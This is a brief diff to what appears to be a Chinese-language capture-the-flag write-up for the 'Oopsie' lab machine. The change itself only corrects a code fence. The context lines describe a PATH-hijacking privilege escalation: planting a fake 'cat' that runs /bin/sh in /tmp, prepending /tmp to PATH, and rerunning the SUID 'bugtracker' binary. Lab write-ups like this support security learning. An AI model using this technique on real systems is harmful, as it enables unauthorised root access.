@@ -229,7 +229,7 @@ echo "/bin/sh" > cat
 ```
 ### 赋予/tmp/cat执行权限，然后劫持 PATH 环境变量：`export PATH=/tmp:$PATH`(告诉系统：当有人运行 `cat` 时，先去 `/tmp` 找，而不是去系统的 `/bin` 找)
 ### 然后再次执行/usr/bin/bugtracker触发提权
-````shell
+```shell
 robert@oopsie:/$ cd /tmp
 cd /tmp
 robert@oopsie:/tmp$ ls
